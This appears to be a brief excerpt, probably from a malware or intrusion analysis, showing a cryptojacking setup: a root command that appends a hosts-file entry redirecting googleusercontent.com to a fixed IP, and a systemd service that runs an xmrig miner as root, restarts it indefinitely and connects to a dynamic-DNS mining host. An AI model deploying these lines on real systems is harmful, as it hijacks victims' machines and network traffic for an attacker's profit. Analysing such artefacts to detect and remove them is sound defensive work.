...
sudo -- sh -c "echo '157.245.216.144  googleusercontent.com' >> /etc/hosts" 
...
[Service]
ExecStart= /usr/local/src/miner/xmrigDaemon --donate-level 1 --donate-over-proxy 1 -o nookgg.ddns.net:443 -k --tls
WatchdogSec=300
Restart=always
RestartSec=60
User=root
